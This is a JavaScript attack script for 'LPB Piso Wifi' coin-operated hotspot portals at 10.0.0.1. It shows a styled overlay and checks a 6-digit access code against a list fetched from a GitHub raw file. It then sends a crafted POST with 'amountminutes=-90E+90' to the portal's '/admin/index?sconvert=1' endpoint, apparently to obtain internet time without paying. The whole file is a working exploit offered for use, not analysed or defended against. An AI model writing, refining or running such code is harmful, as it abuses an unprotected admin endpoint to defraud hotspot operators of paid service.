(async function() {
// ==========================================
// 1. Target IP Validation  
// ==========================================
if (window.location.hostname !== '10.0.0.1') {  
    if (confirm('You must be on http://10.0.0.1/ to use this. Go there now?')) {  
        window.location.href = 'http://10.0.0.1/';  
    }  
    return;  
}  

const CODES_URL = 'https://raw.githubusercontent.com/jimsbautistaparadero/Code/refs/heads/main/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/codes.txt';

// 2. Clear previous UI  
const oldUI = document.getElementById('lpb-ui-root');  
if (oldUI) oldUI.remove();  

// 3. Create Shadow DOM  
const root = document.createElement('div');  
root.id = 'lpb-ui-root';  
const shadow = root.attachShadow({ mode: 'open' });  

// 4. Professional UI Styles  
const style = document.createElement('style');  
style.textContent = `  
    .overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); display: flex; justify-content: center; align-items: center; z-index: 999999; font-family: 'Segoe UI', sans-serif; }  
    .modal { background: #1e1e2e; color: #cdd6f4; width: 320px; border-radius: 16px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; border: 1px solid #313244; animation: popIn 0.3s ease-out; }  
    @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }  
    h2 { margin: 0 0 12px 0; color: #89b4fa; font-size: 22px; font-weight: 600; }  
    p { font-size: 14px; margin-bottom: 20px; color: #a6adc8; line-height: 1.5; }  
    .btn-group { display: flex; gap: 10px; justify-content: center; }  
    button { border: none; padding: 10px 16px; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; transition: all 0.2s; }  
    .btn-yes { background: #89b4fa; color: #11111b; width: 100%; }  
    .btn-yes:hover { background: #74c7ec; transform: translateY(-2px); }  
    .btn-no { background: #45475a; color: #cdd6f4; }  
    .btn-no:hover { background: #585b70; transform: translateY(-2px); }  
    .btn-close { background: #f38ba8; color: #11111b; margin-top: 15px; width: 100%; }  
    .btn-close:hover { background: #eba0ac; transform: translateY(-2px); }  
    .spinner { width: 40px; height: 40px; border: 4px solid #313244; border-top: 4px solid #89b4fa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }  
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }  
    .hidden { display: none; }  
    .warning-text { color: #f38ba8; font-size: 12px; margin-top: 10px; font-weight: bold; }
    input { background: #313244; border: 1px solid #45475a; border-radius: 8px; padding: 10px; color: #cdd6f4; width: 80%; margin-bottom: 15px; text-align: center; font-size: 16px; outline: none; }
    input:focus { border-color: #89b4fa; }
`;  
shadow.appendChild(style);  

// 5. Build UI Layout  
const overlay = document.createElement('div');  
overlay.className = 'overlay';  
overlay.innerHTML = `  
    <div class="modal" id="modal">  
        <div id="content-check">  
            <div class="spinner"></div>  
            <h2>Checking System...</h2>  
            <p>Verifying LPB Network...</p>  
        </div>  

        <div id="content-auth" class="hidden">  
            <h2>Activation</h2>  
            <p>Please enter your 6-digit access code to continue.</p>  
            <input type="text" id="auth-code" maxlength="6" placeholder="000000">  
            <button class="btn-yes" id="btn-verify">Verify Code</button>  
        </div>  
          
        <div id="content-prompt" class="hidden">  
            <h2>Requirements</h2>  
            <p>Only Works for <strong>LPB Piso Wifi</strong>.<br/><br/>Time Must be above <strong>2 min</strong> or must insert <strong>1 coin ₱</strong>.</p>  
            <div class="btn-group">  
                <button class="btn-yes" id="btn-yes">I have time</button>  
                <button class="btn-no" id="btn-no">I need to insert</button>  
            </div>  
            <p class="warning-text">Auto-reloading in 5 seconds...</p>
        </div>  

        <div id="content-error" class="hidden">  
            <h2 style="color: #f38ba8;">Action Required</h2>  
            <p id="error-msg">Time Must be above 2 min or must insert 1 coin ₱.</p>  
            <button class="btn-close" id="btn-close-err">Close</button>  
        </div>  

        <div id="content-loading" class="hidden">  
            <div class="spinner"></div>  
            <h2>Processing...</h2>  
            <p>Applying changes...</p>  
        </div>  
    </div>  
`;  
shadow.appendChild(overlay);  
document.body.appendChild(root);  

// View Manager  
const showView = (id) => {  
    ['content-check', 'content-auth', 'content-prompt', 'content-error', 'content-loading'].forEach(v => {  
        shadow.getElementById(v).classList.add('hidden');  
    });  
    shadow.getElementById(id).classList.remove('hidden');  
};  

// Close Button logic  
const closeUI = () => root.remove();  
shadow.getElementById('btn-close-err').onclick = closeUI;  

// 6. LPB Environment Check  
await new Promise(r => setTimeout(r, 800)); 
const textToSearch = (document.body.innerText + document.title).toLowerCase();  
const isLPB = textToSearch.includes('lpb') || textToSearch.includes('piso');  
  
if (!isLPB) {  
    shadow.getElementById('error-msg').innerText = "Error: Only Works for LPB Piso Wifi.";  
    showView('content-error');  
    setTimeout(() => window.location.reload(), 5000); 
    return;  
}  

// Show Auth View first
showView('content-auth');  

// 7. Code Verification Logic
shadow.getElementById('btn-verify').onclick = async () => {
    const inputCode = shadow.getElementById('auth-code').value.trim();
    
    if (inputCode.length !== 6) {
        alert("Code must be exactly 6 characters.");
        return;
    }

    showView('content-check');
    
    try {
        const response = await fetch(CODES_URL);
        const data = await response.text();
        const validCodes = data.split('\n').map(line => line.trim());

        if (validCodes.includes(inputCode)) {
            showView('content-prompt');
            startInactivityTimer();
        } else {
            shadow.getElementById('error-msg').innerText = "Invalid Access Code.";  
            showView('content-error');  
            setTimeout(() => window.location.reload(), 3000);
        }
    } catch (err) {
        shadow.getElementById('error-msg').innerText = "Network Error: Could not verify codes.";  
        showView('content-error');  
    }
};

let promptTimeout;
const startInactivityTimer = () => {
    promptTimeout = setTimeout(() => {
        window.location.reload();
    }, 5000);
};

// 8. Handlers for the Prompt  
shadow.getElementById('btn-no').onclick = () => {  
    clearTimeout(promptTimeout); 
    shadow.getElementById('error-msg').innerHTML = "Time Must be above 2 min<br/>or must insert 1 coin ₱.";  
    showView('content-error');  
};  

shadow.getElementById('btn-yes').onclick = async () => {  
    clearTimeout(promptTimeout); 
    showView('content-loading');  

    const controller = new AbortController();
    const fetchTimeoutId = setTimeout(() => {
        controller.abort();
        window.location.reload();
    }, 5000);

    try {  
        await fetch('/admin/index?sconvert=1', {  
            method: 'POST',  
            headers: {  
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',  
                'X-Requested-With': 'XMLHttpRequest'  
            },  
            body: 'amountminutes=-90E+90', 
            signal: controller.signal      
        });  
    } catch (err) {  
        console.error("Network Error or Timeout:", err);
    } finally {
        clearTimeout(fetchTimeoutId);
        window.location.reload();
    }
};

})();
